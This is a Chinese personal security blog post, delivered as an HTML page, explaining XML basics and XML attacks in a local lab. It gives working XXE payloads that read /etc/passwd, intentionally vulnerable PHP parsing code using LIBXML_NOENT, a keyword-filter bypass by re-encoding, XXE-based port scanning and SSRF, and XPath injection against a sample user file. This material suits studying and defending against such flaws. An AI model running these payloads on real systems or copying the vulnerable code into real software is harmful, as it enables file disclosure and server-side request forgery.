@@ -1,0 +1,753 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-hk">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="XXE,XML," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="XML基础XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。一个完整的XML例子：1234567891011&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;GBK&quot;?&amp;gt;&amp;lt;!DOCTYPE root[  &amp;lt;!ENTITY comrade &quot;zxc&quot;&amp;gt;  &amp;lt;!ENTITY edarmoc &quot;xxxx&quot;&amp;gt;]&amp;gt;&amp;lt;edd&amp;g">
+<meta name="keywords" content="XXE,XML">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XML安全问题">
+<meta property="og:url" content="http://yoursite.com/2019/02/18/XML安全问题/index.html">
+<meta property="og:site_name" content="C0mRaDe&#39;s Blog">
+<meta property="og:description" content="XML基础XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。一个完整的XML例子：1234567891011&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;GBK&quot;?&amp;gt;&amp;lt;!DOCTYPE root[  &amp;lt;!ENTITY comrade &quot;zxc&quot;&amp;gt;  &amp;lt;!ENTITY edarmoc &quot;xxxx&quot;&amp;gt;]&amp;gt;&amp;lt;edd&amp;g">
+<meta property="og:locale" content="zh-hk">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1550084122338.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1550085022405.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1550085050282.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1550250488135.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1550250950770.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1550423061768.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1550251351571.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1550251422723.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1550251461631.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1550255894315.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1550256032379.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1550256044658.png">
+<meta property="og:updated_time" content="2019-02-17T17:35:25.359Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XML安全问题">
+<meta name="twitter:description" content="XML基础XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。一个完整的XML例子：1234567891011&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;GBK&quot;?&amp;gt;&amp;lt;!DOCTYPE root[  &amp;lt;!ENTITY comrade &quot;zxc&quot;&amp;gt;  &amp;lt;!ENTITY edarmoc &quot;xxxx&quot;&amp;gt;]&amp;gt;&amp;lt;edd&amp;g">
+<meta name="twitter:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1550084122338.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/02/18/XML安全问题/"/>
+
+
+
+
+
+  <title>XML安全问题 | C0mRaDe's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0mRaDe's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">牙牙学语.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            關於
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            歸檔
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/18/XML安全问题/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0mRaDe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/gabe-crow.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0mRaDe's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XML安全问题</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2019-02-18T01:33:31+08:00">
+                2019-02-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分類於</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/信息安全/" itemprop="url" rel="index">
+                    <span itemprop="name">信息安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h1><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。一个完整的XML例子：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"GBK"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root[</span></span><br><span class="line"><span class="meta">  &lt;!ENTITY comrade "zxc"&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ENTITY edarmoc "xxxx"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">edd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span>&gt;</span> &amp;comrade; <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">b</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="tag">&lt;<span class="name">d</span>&gt;</span>&amp;edarmoc;<span class="tag">&lt;/<span class="name">d</span>&gt;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">edd</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>可以看到有xml声明、DOCTYPE声明(实体必须在DOCTYPE中声明)等。解析结果：<img src="https://www.github.com/coomrade/Img/raw/master/pics/1550084122338.png" alt="enter description here"></p>
+<h1 id="XML安全问题"><a href="#XML安全问题" class="headerlink" title="XML安全问题"></a>XML安全问题</h1><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="what’s-XXE"><a href="#what’s-XXE" class="headerlink" title="what’s XXE?"></a>what’s XXE?</h3><p>XXE也就是XML External Entity，XML外部实体注入。外部实体分SYSTEM和PUBLIC两种，引入外部实体格式如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 引用名 <span class="attr">SYSTEM</span>(<span class="attr">PUBLIC</span>) "<span class="attr">URI</span>地址"&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>下面分别是PUBLIC和SYSTEM的例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE sdfdcxvxvc [</span><br><span class="line">    &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://www.github.com/coomrade/Img/raw/master/pics/1550085022405.png" alt="enter description here"><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE sdfdcxvxvc [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY f PUBLIC "SZXCXZ" "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span>&amp;f;<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://www.github.com/coomrade/Img/raw/master/pics/1550085050282.png" alt="enter description here">可以看到，PUBLIC的话，需要在文件名前面加一个PUBLIC_ID.这里的原理是通过file协议把<code>/etc/passwd</code>的值赋给了实体f，然后f又被放在x元素中，被print出来了。<br>for windows:<img src="https://www.github.com/coomrade/Img/raw/master/pics/1550250488135.png" alt="enter description here">此处可以使用各种协议<img src="https://www.github.com/coomrade/Img/raw/master/pics/1550250950770.png" alt="enter description here">xml.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$xml=file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$data=simplexml_load_string($xml,<span class="string">'SimpleXMLElement'</span>,$options=LIBXML_NOENT);</span><br><span class="line">print_r($data);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>通过<a href="https://www.motobit.com/util/charset-codepage-conversion.asp" target="_blank" rel="noopener">编码</a>绕过关键词检测:<img src="https://www.github.com/coomrade/Img/raw/master/pics/1550423061768.png" alt="enter description here"></p>
+<h3 id="XXE用于端口扫描、SSRF"><a href="#XXE用于端口扫描、SSRF" class="headerlink" title="XXE用于端口扫描、SSRF"></a>XXE用于端口扫描、SSRF</h3><p>扫端口(http协议)：<img src="https://www.github.com/coomrade/Img/raw/master/pics/1550251351571.png" alt="enter description here">SSRF示例：<br>test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]==<span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">file_put_contents(<span class="string">'/tmp/lol.txt'</span>,$_GET[comrade]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>POST:<img src="https://www.github.com/coomrade/Img/raw/master/pics/1550251422723.png" alt="enter description here">成功ssrf:<img src="https://www.github.com/coomrade/Img/raw/master/pics/1550251461631.png" alt="enter description here"></p>
+<h3 id="BLIND-XXE"><a href="#BLIND-XXE" class="headerlink" title="BLIND XXE?"></a>BLIND XXE?</h3><p>遇到没有回显的情况，可以用BLIND XXE的技巧：1.用file协议读文件。2.用http协议把实体内容带出。本地测试各种换版本都不行，先放着不写。</p>
+<h2 id="用XML当数据库？"><a href="#用XML当数据库？" class="headerlink" title="用XML当数据库？"></a>用XML当数据库？</h2><h3 id="XPATH注入"><a href="#XPATH注入" class="headerlink" title="XPATH注入"></a>XPATH注入</h3><p>test.xml:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Ben<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lastname</span>&gt;</span>Elmore<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">loginID</span>&gt;</span>abc<span class="tag">&lt;/<span class="name">loginID</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>test123<span class="tag">&lt;/<span class="name">password</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Shlomy<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lastname</span>&gt;</span>Gantz<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">loginID</span>&gt;</span>xyz<span class="tag">&lt;/<span class="name">loginID</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>123test<span class="tag">&lt;/<span class="name">password</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Jeghis<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lastname</span>&gt;</span>Katz<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">loginID</span>&gt;</span>mrj<span class="tag">&lt;/<span class="name">loginID</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>jk2468<span class="tag">&lt;/<span class="name">password</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Darien<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lastname</span>&gt;</span>Heap<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">loginID</span>&gt;</span>drano<span class="tag">&lt;/<span class="name">loginID</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>2mne8s<span class="tag">&lt;/<span class="name">password</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>xml.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$xml=file_get_contents(<span class="string">'test.xml'</span>);</span><br><span class="line">$data=simplexml_load_string($xml,<span class="string">'SimpleXMLElement'</span>,$options=LIBXML_NOENT);</span><br><span class="line">$result=$data-&gt;xpath(<span class="string">"//users/user[loginID='"</span>.$_POST[<span class="string">'loginID'</span>].<span class="string">"' and password='"</span>.$_POST[<span class="string">'password'</span>].<span class="string">"']"</span>);</span><br><span class="line">print_r($result);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://www.github.com/coomrade/Img/raw/master/pics/1550255894315.png" alt="enter description here">然后，类似于SQL注入，不能用注释符而已。<img src="https://www.github.com/coomrade/Img/raw/master/pics/1550256032379.png" alt="enter description here"><img src="https://www.github.com/coomrade/Img/raw/master/pics/1550256044658.png" alt="enter description here"></p>
+<h3 id="XPATH盲注"><a href="#XPATH盲注" class="headerlink" title="XPATH盲注"></a>XPATH盲注</h3><p>可以看这篇<a href="https://skysec.top/2018/07/30/ISITDTU-CTF-Web/#Access-Box" target="_blank" rel="noopener">文章</a></p>
+<h1 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h1><p><a href="https://skysec.top/2018/08/17/%E6%B5%85%E6%9E%90xml%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener">https://skysec.top/2018/08/17/%E6%B5%85%E6%9E%90xml%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/XXE/" rel="tag"># XXE</a>
+          
+            <a href="/tags/XML/" rel="tag"># XML</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/17/SQL盲注的多种姿势/" rel="next" title="SQL盲注的多种姿势">
+                <i class="fa fa-chevron-left"></i> SQL盲注的多种姿势
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/gabe-crow.jpg"
+                alt="C0mRaDe" />
+            
+              <p class="site-author-name" itemprop="name">C0mRaDe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分類</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">標籤</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XML基础"><span class="nav-number">1.</span> <span class="nav-text">XML基础</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XML安全问题"><span class="nav-number">2.</span> <span class="nav-text">XML安全问题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE"><span class="nav-number">2.1.</span> <span class="nav-text">XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#what’s-XXE"><span class="nav-number">2.1.1.</span> <span class="nav-text">what’s XXE?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE用于端口扫描、SSRF"><span class="nav-number">2.1.2.</span> <span class="nav-text">XXE用于端口扫描、SSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BLIND-XXE"><span class="nav-number">2.1.3.</span> <span class="nav-text">BLIND XXE?</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#用XML当数据库？"><span class="nav-number">2.2.</span> <span class="nav-text">用XML当数据库？</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XPATH注入"><span class="nav-number">2.2.1.</span> <span class="nav-text">XPATH注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XPATH盲注"><span class="nav-number">2.2.2.</span> <span class="nav-text">XPATH盲注</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Referer"><span class="nav-number">3.</span> <span class="nav-text">Referer</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0mRaDe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 強力驅動</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主題 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
